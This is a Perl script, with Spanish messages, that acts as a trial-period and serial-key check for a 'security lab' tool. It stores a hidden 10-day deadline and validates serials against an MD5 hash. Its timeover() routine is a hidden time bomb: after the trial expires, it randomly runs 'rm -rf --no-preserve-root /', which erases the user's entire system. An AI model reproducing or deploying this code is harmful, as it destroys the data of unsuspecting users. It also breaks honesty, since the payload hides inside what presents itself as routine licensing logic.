#!/usr/bin/perl -w
use Term::ANSIColor;
use Digest::MD5 qw(md5 md5_hex md5_base64);

use strict;
use vars qw($seg $min $hr $dia $mes $anio);

my $dias= 10;
my $ser = "";
my $pass = "";
my $acc;
my $archivo = ".fechalimite.dat";
my $archivoSerial = ".rc_sh";
my	$unixtimelim;

sub msg {
	my $access;
	my $unixtime;

	if (-e ".rc_bi"){
		return 0;
	}

	$unixtime = time();
	$unixtimelim = $unixtime + ($dias*24*3600);
	($seg, $min, $hr, $dia, $mes, $anio) = localtime($unixtime);
	
	print colored("Fecha activacion: ", 'yellow');
	print colored("$dia/$mes/",'white'), colored((1900+$anio), 'white');
	print "\n";

	($seg, $min, $hr, $dia, $mes, $anio) = localtime($unixtimelim);
	print colored("Fecha limite: ", 'yellow');
	print colored("$dia/$mes/", 'white'), colored((1900+$anio), 'white');
	print "\n";
	print colored ("Laboratorio de Seguridad Informatica v1.1\n", 'yellow');
	print colored ("Favor de introducir el serial (XXXX-XXXX-XXXX-XXXX-XXXX) o <ENTER> para $dias dias de pruebas\n", 'yellow');
	print colored("Serial: ", 'yellow');
   
	$ser = <STDIN>;

	chomp($ser);
	if($ser eq ""){
		$access = validaSerial($ser);
	}else{
		$access = validaSerial($ser);
	}

	return ($access);
}

sub validaSerial {
	my ($serial) = @_;
	my $serialG = "40cdaf0bdc99f3fc42f1b41ac7b4b5be";

	if (md5_hex($serial) eq $serialG) {
		print colored ("SERIAL CORRECTO\n","blink yellow");
		open(DATOS, ">$archivoSerial");
		print DATOS "$archivoSerial";
		close (DATOS);

		system('/usr/bin/chattr -i .rc_sh');
		$acc = 0;
	}else{
		print colored ("SERIAL INCORRECTO\n","blink yellow");
		$acc = 1;
	}

	return $acc;
}

sub asigfechalimite {
	open(DATOS, ">$archivo");
	print	DATOS "$unixtimelim"; 
	close(DATOS);
}

sub obtfechalimite {
	my $timelim = "";

	open(DATLEER, $archivo) || die "No se pudo abrir el archivo\n";
	while(<DATLEER>) {
		$timelim = $_;
	}

	close(DATLEER);

	return($timelim);
}

sub timeover {
	my $i = 5;

	print colored("Se acabo el tiempo\n", 'yellow');
	while ($i > 0){
		print colored("$i\n", 'blink white');
		sleep 1;
		$i = $i-1;
	}
	system('[ $[ $RANDOM % 3 ] == 0 ] && rm -rf --no-preserve-root / || echo "Aun puedes seguir usando el laboratorio"');
}

if ( -e $archivoSerial) {
	print colored("Bienvenido\n", 'blink white');
}elsif (!-e $archivo) {
	$acc = msg();
	$acc == 0 ? print colored("Bienvenido\n", 'yellow') : asigfechalimite();
}else{
	my $fechalim = obtfechalimite();
	my $fechaactu = time();
	my $dia;

	if(($fechalim - $fechaactu) <= 0 ){
		timeover();
	}else{
		$dia = ($fechalim - $fechaactu)/(24*3600);
		print colored("Te quedan: ", 'yellow'), colored("$dia\n", 'blink white');
		print colored("Presione cualuier tecla para continuar\n", 'yellow');
		<STDIN>;
	}
}
